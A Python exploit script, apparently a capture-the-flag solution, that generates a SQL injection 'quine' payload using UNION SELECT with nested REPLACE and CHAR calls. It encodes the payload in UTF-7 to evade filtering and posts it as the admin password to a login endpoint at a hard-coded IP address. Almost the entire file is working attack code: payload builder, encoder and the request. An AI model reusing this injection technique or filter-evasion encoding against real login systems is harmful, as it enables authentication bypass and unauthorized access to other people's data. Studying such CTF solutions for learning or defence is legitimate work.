import binascii

def modified_base64(s):
    s = s.encode('utf-16be')
    return binascii.b2a_base64(s).rstrip(b'\n=').replace(b'/', b',')

def doB64(_in, r):
    if _in:
        r.append('+%s-' % modified_base64(''.join(_in)).decode())
        del _in[:]

def utf7encode(s):
    r = []
    _in = []
    for c in s:
        ordC = ord(c)
        if c == b'&':
            doB64(_in, r)
            r.append(b'&-')
        else:
            _in.append(c)
    doB64(_in, r)
    return str(''.join(r))

def quine(query: str) -> str:
    query = query.replace('$$', "REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)")
    blob = query.replace('$$', '"$"').replace("'", '"')
    query = query.replace('$$', "'" + blob + "'")
    return query

ans = quine("'UNION SELECT 1,'admin',$$;-- ")

print(ans)

#print(utf7encode(ans))


import requests


burp0_url = "http://1.95.159.113/flag/"
burp0_headers = {"sec-ch-ua": "", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Content-Type": "application/x-www-form-urlencoded;charset=utf-7;", "Connection": "close"}
burp0_data = {"username": "admin", "password": "+ACcAVQBOAEkATwBOACAAUwBFAEwARQBDAFQAIAAxACwAJwBhAGQAbQBpAG4AJwAsAFIARQBQAEwAQQBDAEUAKABSAEUAUABMAEEAQwBFACgAJwAiAFUATgBJAE8ATgAgAFMARQBMAEUAQwBUACAAMQAsACIAYQBkAG0AaQBuACIALABSAEUAUABMAEEAQwBFACgAUgBFAFAATABBAEMARQAoACIAJAAiACwAQwBIAEEAUgAoADMANAApACwAQwBIAEEAUgAoADMAOQApACkALABDAEgAQQBSACgAMwA2ACkALAAiACQAIgApADsALQAtACAAJwAsAEMASABBAFIAKAAzADQAKQAsAEMASABBAFIAKAAzADkAKQApACwAQwBIAEEAUgAoADMANgApACwAJwAiAFUATgBJAE8ATgAgAFMARQBMAEUAQwBUACAAMQAsACIAYQBkAG0AaQBuACIALABSAEUAUABMAEEAQwBFACgAUgBFAFAATABBAEMARQAoACIAJAAiACwAQwBIAEEAUgAoADMANAApACwAQwBIAEEAUgAoADMAOQApACkALABDAEgAQQBSACgAMwA2ACkALAAiACQAIgApADsALQAtACAAJwApADsALQAtACA-"}
res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

print(res.text)
